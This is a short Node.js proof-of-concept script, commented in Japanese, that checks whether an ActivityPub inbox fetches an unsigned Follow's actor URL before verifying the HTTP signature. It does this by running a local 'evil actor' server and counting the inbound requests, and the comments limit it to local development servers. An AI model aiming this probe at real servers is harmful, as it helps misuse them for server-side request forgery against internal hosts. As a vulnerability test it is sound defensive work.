#!/usr/bin/env node
// PoC 2: ActivityPub inbox actor-SSRF — ローカルのみ対象。prodに実行禁止。
// 使い方: npm run dev:test を起動してから node poc/ssrf-inbox.mjs
// 期待: 署名なしPOSTでもevil-actorへGETが来たら VULN (検証前にfetchしている証拠)。
import http from 'node:http';

const BASE = process.env.BASE_URL ?? 'http://localhost:8788';

let hit = 0;
const evil = http.createServer((req, res) => {
  if (req.url?.startsWith('/evil-actor')) {
    hit++;
    console.log(`[HIT] server fetched ${req.method} ${req.url}`);
    res.writeHead(200, { 'content-type': 'application/activity+json' });
    res.end(JSON.stringify({ id: 'x', publicKey: { publicKeyPem: 'bogus' } }));
  } else {
    res.writeHead(404);
    res.end();
  }
});
await new Promise((r) => evil.listen(0, '127.0.0.1', r));
const port = evil.address().port;
const actor = `http://127.0.0.1:${port}/evil-actor`;
console.log(`evil actor: ${actor}`);

const activity = {
  '@context': 'https://www.w3.org/ns/activitystreams',
  type: 'Follow',
  actor,
  object: `${BASE}/users/someone`,
};
const r = await fetch(`${BASE}/api/inbox`, {
  method: 'POST',
  headers: { 'content-type': 'application/activity+json' },
  body: JSON.stringify(activity),
});
console.log(`POST /api/inbox -> HTTP ${r.status} body: ${(await r.text()).slice(0, 200)}`);
await new Promise((r2) => setTimeout(r2, 500));
evil.close();
const vuln = hit > 0;
console.log(vuln ? `\nRESULT: VULNERABLE (署名検証前にfetch, hits=${hit})` : '\nRESULT: not reproduced');
process.exit(vuln ? 1 : 0);
